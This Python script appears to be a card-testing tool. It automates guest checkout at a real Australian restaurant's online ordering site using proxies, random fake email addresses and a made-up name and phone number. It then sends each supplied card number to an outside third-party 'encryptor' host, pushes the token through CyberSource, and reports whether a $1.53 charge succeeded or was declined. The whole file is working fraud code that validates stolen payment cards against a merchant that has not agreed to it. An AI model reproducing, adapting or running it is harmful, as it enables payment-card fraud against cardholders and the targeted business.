import requests,random,string
from proxy import proxies

def getstr( data, first, last ):
    try: 
        start = data.index( first ) + len( first ) 
        end = data.index( last, start ) 
        return data[start:end] 
    except ValueError: 
        return None

def generated_email():
    domain = ["@gmail.com", "@yahoo.com", "@outlook.com", "@hotmail.com", "@aol.com", "@yandex.com", "@protonmail.com", "@mail.com", "@icloud.com", "@zoho.com", "@gmx.com", "@yopmail.com", "@mailinator.com", "@email.com"]
    user = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 10)))
    email = user + random.choice(domain)
    return email

async def cyber_charge1(card):
    r = requests.session()
    proxy = proxies()
    r.proxies = proxy
    email = generated_email()
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        #'cookie': 'PHPSESSID=e21a7fcbd0abded915e6b1e66a8740f9; PrestaShop-bb1fe91d53ef825dfd37d7e84eac2c8b=def5020071a52e055e206e42b8f27823b073f164d1dc3c0cdcf79cb1280ff44ec01b9c0e20d11642a80bde2698d449df6001009976ee46d246cceba5dafd4503426160048a67673de9d48f2408d0460b86c5515249b206c9d76267c3aedb60f508eeb1260fb5a0d4318624754c37e4b2ada49dcead68cddd1f567a9f58e72b5596eeae69f0cad3b14ab8126b3ac08f6e537b8f4c59918df03184a4d32c9098e7b32cf0cdce82283863a822804d3a37c236f257923307d4eeebdbb6281b46dc0e7b00fe73a769195ef088d565dec2c19939a01f2793290f1bb5c3054656a18de143e7056a30f9590d29b26bfdaf113a273a265246b0b2a20de412e363598eaff4dae584685d799672098b5561ee3403c00ce5e140c64d177b5cb5faa8946c6aad41c58b3fc9ebbf280fd850e72278c369bf66bd7cd50524c4a7bcf178f5496b',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://joysbbqandgrill.qiki.com.au/13-drinks', headers=headers)
    except Exception as e:
        return "Error in 1st request" + str(e)
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=37fc3463e79bbb980ebe8649bf8b0d20; an_cookie_banner=1; PrestaShop-bb1fe91d53ef825dfd37d7e84eac2c8b=def50200442a44db00a65758d0c33b244fdacfdaf1bc5ded2f02aaa69b2aa1d1947389e71acb20f9c5f18f90c1699a0a58a600ac53f49aa06e6a2dd292f2c1ff1cff08c0e544821c19de409fbb7a64bf4bf80890aec823b01cc9f5718a3e17f6999b7f388832491f718d4ba5c916514fa2ba1a50c8e31b91c0fdbc882ec166364697f1ca279838320a830d460493380438c85d64c2652257afa998f2eb68c4477df234a197abea075a16d4b7c3151688b630528bddd1249ac873a1c2cb74afc91c22eb68c67c084622a7b1cbd068334094917fa85c6774edaf2c1c43d3af5b97e8b40b0d0d48104b4915a4c3615003b03dffd67e60104020134ad27dd7996d0783365817d09348f9136439334f7b4987c67bd104bc765e',
        'origin': 'https://joysbbqandgrill.qiki.com.au',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://joysbbqandgrill.qiki.com.au/13-drinks',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'token': '84f42145d4f29a93d8372c439601178e',
        'id_product': '82',
        'id_customization': '0',
        'qty': '1',
        'product_dietary_requirements': '',
        'add': '1',
        'action': 'update'
    }
    try:
        response = r.post('https://joysbbqandgrill.qiki.com.au/cart', headers=headers, data=data)
    except Exception as e:
        return "Error in 2nd request" + str(e)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        #'cookie': 'PHPSESSID=37fc3463e79bbb980ebe8649bf8b0d20; an_cookie_banner=1; PrestaShop-bb1fe91d53ef825dfd37d7e84eac2c8b=def50200f001273ec9b53436a3cb27e51e0577de9d6d56821a2c7b89ea8029beb5ab781cce6c0993e69c32d44d35ac743842470565984bc01fa943e9cc1a1a17a2b394eadde81ad14dc4f9a00e206baabaf623cf92099362cc5c0c556643fba66f650d369472b95cef5f5f1d6246aeae5d656252ddac313e22238958ba5830eda8df063661a8b2c6a040929f140a268d942ba3ea4e50b767e93e143dcfa9bcf77dce4ff770ce279be7166c5cacdf5cebcbafb07ae7fb3927ab00fe4a65a3400004d3b07482f36ec02a72c28ebe78e66a85ff9579f4d50a763fcf057bac1c60cb8c822a4aa64635271b8c4eb996e6ec202894bb6ae21a670c2156cb33a33197ab07be4581e1196f3242fc3346248f64c36bde09612b55fea56b4397139b2f53c9137c0671e1a5',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://joysbbqandgrill.qiki.com.au/13-drinks',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://joysbbqandgrill.qiki.com.au/order', headers=headers) 
    except Exception as e:
        return "Error in 3rd request" + str(e) 
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'PHPSESSID=7505d33fe73f580f9e1e9649aa6fb2c9; PrestaShop-bb1fe91d53ef825dfd37d7e84eac2c8b=def50200be0d47e178e10c205fab0fcbeb06441ca19575e29c058f4eb6dd202a9d0f817d099e8c38bc77a506cab422b27c24ff73e5c5f27723d64fab6f98807cdf277a1d3bc17cbcd11fa57f0a2e172ef5f71a49bea2d69a9e4408ccba63b0a2427fa69d9da4c50c1eba48bb484d39e050d7616942590f0bcbfa54a088db1006bc6d466cc9e6d778ee829d576ad459c1fcb7b7b2cd1cd95f305c9792e554cbf842314e9f9118babf60a4c4dc33a1ecb4f69ebd89e0eaf7d01977b2c76e2da8f2fb037d8e257681b22a4c99fdf8a9255f7fe2d84d86832e73b96142d5b7b23c06b149ab5f778b9a260bdcfcf6af0c844925bc35e3f303fc312539b3058f814122c9d165dfe3704a3e476d4693cac57a6457951e1bcad41157f6826790c25539d467bc95a60288; an_cookie_banner=1',
        'origin': 'https://joysbbqandgrill.qiki.com.au',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://joysbbqandgrill.qiki.com.au/order',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    data = {
        'firstname': 'Albedo',
        'lastname': 'Jones',
        'email': email,
        'submitCreate': '1',
        'continue': '1',
    }
    try:
        response = r.post('https://joysbbqandgrill.qiki.com.au/order', headers=headers, data=data)
    except Exception as e:
        return "Error in 4th request" + str(e)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        #'cookie': 'PHPSESSID=7505d33fe73f580f9e1e9649aa6fb2c9; an_cookie_banner=1; PrestaShop-bb1fe91d53ef825dfd37d7e84eac2c8b=def502006d643573ac7d7f6c41625ca1efcefe74a229ba4a730e8a9b78a3c68fea96a4ac5d75b641299dec53bf337eb0780c4e99cf3f6eec99d0fde51be22757f96d34bcab8de7373f94ae4b47f097c445cf1aa16e2d5fc063cc8f953f36bf143791e075bbd44de69be3c12dcbd43e53c7a0771a12186f1fcb5d332a23a07017b6e64902c657a3632eb6c27335debc5f088fc37c7569b79c8522b4071d91e22df12b507cddfcba18fd1678c0648880b086053be2e0bdbad03329ebc50aac2fe0a10f50e8badaf16f6b0215ecc31b1f826b2a754d922341f2c83984ab2e2cb584749cd3c836192a657fa2e56c04c9c07b75e94b68c95294b11e9717cea42b03f685eb7860ee1a08aeacaa481b54c79427c59dc2c97d90d8d3d06d9269a74d5337456eb827ae0128b982dae1f357553d421b0a05d395397d11b0dce57bf19424d38673a2a672b709be6dd7d06cf4cd4281223cf8df1cc216f1f9d7181db172a4375dbb6938d16794988aaa1239c9b01c6de71ad3e19d6e06703381ce4b0711340a3fc0761d557117e89db941695f1bb7774b9b96e59f01142237e773584c44092699d729d31d1b0a91bd6897815209e8925ee33ff2aa4c12dac10d4e0373ea18326a9bc9e5c0b0969ec03fa0619035e0cab6c4ea8de59a7b887081214e5da008e9a56176a7e19e15d0a57cf161b0fcfe988d8320465a3efbc14311f2745708aeb2e901ff191c0ff95e792eb5d2f5b274431bb0f7810b8e02bbe31defc4331edd5bdf2807001ec428e6f76c08',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://joysbbqandgrill.qiki.com.au/order',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://joysbbqandgrill.qiki.com.au/order', headers=headers)
    except Exception as e:
        return "Error in 5th request" + str(e)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'PHPSESSID=7505d33fe73f580f9e1e9649aa6fb2c9; an_cookie_banner=1; PrestaShop-bb1fe91d53ef825dfd37d7e84eac2c8b=def502006d643573ac7d7f6c41625ca1efcefe74a229ba4a730e8a9b78a3c68fea96a4ac5d75b641299dec53bf337eb0780c4e99cf3f6eec99d0fde51be22757f96d34bcab8de7373f94ae4b47f097c445cf1aa16e2d5fc063cc8f953f36bf143791e075bbd44de69be3c12dcbd43e53c7a0771a12186f1fcb5d332a23a07017b6e64902c657a3632eb6c27335debc5f088fc37c7569b79c8522b4071d91e22df12b507cddfcba18fd1678c0648880b086053be2e0bdbad03329ebc50aac2fe0a10f50e8badaf16f6b0215ecc31b1f826b2a754d922341f2c83984ab2e2cb584749cd3c836192a657fa2e56c04c9c07b75e94b68c95294b11e9717cea42b03f685eb7860ee1a08aeacaa481b54c79427c59dc2c97d90d8d3d06d9269a74d5337456eb827ae0128b982dae1f357553d421b0a05d395397d11b0dce57bf19424d38673a2a672b709be6dd7d06cf4cd4281223cf8df1cc216f1f9d7181db172a4375dbb6938d16794988aaa1239c9b01c6de71ad3e19d6e06703381ce4b0711340a3fc0761d557117e89db941695f1bb7774b9b96e59f01142237e773584c44092699d729d31d1b0a91bd6897815209e8925ee33ff2aa4c12dac10d4e0373ea18326a9bc9e5c0b0969ec03fa0619035e0cab6c4ea8de59a7b887081214e5da008e9a56176a7e19e15d0a57cf161b0fcfe988d8320465a3efbc14311f2745708aeb2e901ff191c0ff95e792eb5d2f5b274431bb0f7810b8e02bbe31defc4331edd5bdf2807001ec428e6f76c08',
        'origin': 'https://joysbbqandgrill.qiki.com.au',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://joysbbqandgrill.qiki.com.au/order',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

    data = {
        'deliverypickup_firstname': '      Albedo      ',
        'deliverypickup_lastname': '      Jones      ',
        'deliverypickup_email': email,
        'deliverypickup_phone': '0485906541',
        'deliverypickup_time': '11:50 PM',
        'confirm-deliverypickup': '1',
    }
    try:
        response = r.post('https://joysbbqandgrill.qiki.com.au/order', headers=headers, data=data)
    except Exception as e:
        return "Error in 6th request" + str(e)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # 'cookie': 'PHPSESSID=7505d33fe73f580f9e1e9649aa6fb2c9; an_cookie_banner=1; PrestaShop-bb1fe91d53ef825dfd37d7e84eac2c8b=def502006d643573ac7d7f6c41625ca1efcefe74a229ba4a730e8a9b78a3c68fea96a4ac5d75b641299dec53bf337eb0780c4e99cf3f6eec99d0fde51be22757f96d34bcab8de7373f94ae4b47f097c445cf1aa16e2d5fc063cc8f953f36bf143791e075bbd44de69be3c12dcbd43e53c7a0771a12186f1fcb5d332a23a07017b6e64902c657a3632eb6c27335debc5f088fc37c7569b79c8522b4071d91e22df12b507cddfcba18fd1678c0648880b086053be2e0bdbad03329ebc50aac2fe0a10f50e8badaf16f6b0215ecc31b1f826b2a754d922341f2c83984ab2e2cb584749cd3c836192a657fa2e56c04c9c07b75e94b68c95294b11e9717cea42b03f685eb7860ee1a08aeacaa481b54c79427c59dc2c97d90d8d3d06d9269a74d5337456eb827ae0128b982dae1f357553d421b0a05d395397d11b0dce57bf19424d38673a2a672b709be6dd7d06cf4cd4281223cf8df1cc216f1f9d7181db172a4375dbb6938d16794988aaa1239c9b01c6de71ad3e19d6e06703381ce4b0711340a3fc0761d557117e89db941695f1bb7774b9b96e59f01142237e773584c44092699d729d31d1b0a91bd6897815209e8925ee33ff2aa4c12dac10d4e0373ea18326a9bc9e5c0b0969ec03fa0619035e0cab6c4ea8de59a7b887081214e5da008e9a56176a7e19e15d0a57cf161b0fcfe988d8320465a3efbc14311f2745708aeb2e901ff191c0ff95e792eb5d2f5b274431bb0f7810b8e02bbe31defc4331edd5bdf2807001ec428e6f76c08',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://joysbbqandgrill.qiki.com.au/order',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://joysbbqandgrill.qiki.com.au/order', headers=headers)
        ctx = getstr(response.text, 'name="ctx" value="', '">')
    except Exception as e:
        return "Error in 7th request" + str(e)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }
    try:
        response = requests.get(
            f'https://asianprozyy.us/encrypt/cybersource?card={card}&body={ctx}',
            headers=headers,
        )
        if response.status_code == 200:
            cyb_tk = response.json()['encrypted']
    except Exception as e:
        return "Error in encryptor request" + str(e)

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/jwt; charset=UTF-8',
        'origin': 'https://flex.cybersource.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://flex.cybersource.com/microform/bundle/v2.4.0/iframe.html?keyId=03sazBCJYhfHYDJkgerQZdkfVFyucF9o',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }
    try:
        response = r.post('https://flex.cybersource.com/flex/v2/tokens', headers=headers, data=cyb_tk)
        last_tk = response.text
    except Exception as e:
        return "Error in 8th request" + str(e)
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=37fc3463e79bbb980ebe8649bf8b0d20; an_cookie_banner=1; PrestaShop-bb1fe91d53ef825dfd37d7e84eac2c8b=def50200f7059b4fe8f138ce74c07ec43b70de914cb4323211ad2301ae170324a62bcdb1965b02b66999d41392d74cb95165f9966b42ecf2a7c2ea56cc19be641892807e65040d414dea802b10a04990b1da2136f762cb0ac98b23262df4278a7df219104a64898910fd08a719da89f409c99db4c5c22fa4043dd6b42bc7ecf4f3544a9a1192f79f4d43080e10d47ca515ee0d8f62c339ff79daf8f467973227dcbcea69f8f4098f7e75b995f5e0b55f8788cca1a835468a2febc1fb6ed3193530ffb8cab8d3c2e25e854e03e14bbfa4c813d8ce8c79f1828f14e332483acfc41dc3bcc1cf965cb59c5cf9f3f50db7691e8fa790ca41dff84ef03f96e39b438de3f90e97a621cf69812d3f5ffab760b1a4803098d02a80a9c13f2c54da9099abd152c8713c3db096fd91e3f5f6c826f711acc871cdf0eba8e95b97b13d4426495d47aa5bf4a7e6d0240732de98f340d7f7e70c863395c2e996f1040129e9f5d377e5b6bb4f55748708e5b6949ec2823c6c4f9cc510bc444f32848cdaf23add2b931ee2fa03c824d4bc81b2ee4d2fc5d344a90cca6d97abb73b0899906d63460378041b451de104fcd86a61d7511679d9deb48c08af61cd7fbeecb78ceef061c98ecd73a8389d377a9cc676c65e33cfad77be5a731241386f7b7054e3c37bf776c2ae9b24bb159900f2da653648785cf79ddc28ab9d930ed39a7bd78d1b3fb41bd0019df9a2dde28058be8e3b321d4411fc9fdda00dae192b963a83bbda93a2afaa0572cc02f23edb958516e2afa2fede455cfb9f10356b6033ca49fffa32db3aaf140f46e06f819dd942',
        'origin': 'https://joysbbqandgrill.qiki.com.au',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://joysbbqandgrill.qiki.com.au/order',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': 'true',
        'payment_jwt': f'"{last_tk}"',
        'cs_payment_method': 'card',
    }
    try:
        response = r.post(
            'https://joysbbqandgrill.qiki.com.au/module/cybersourcepayment/validation',
            headers=headers,
            data=data,
        )
        if '"code":200' in response.text:
            return 'Charged $1.53 | Code: 200'
        if '"code":0' in response.text and '"status":"DECLINED"' in response.text:
            msg = getstr(response.text, '"message":"', '"')
            return msg
        else:
            return response.text
    except Exception as e:
        return "Error in last request" + str(e)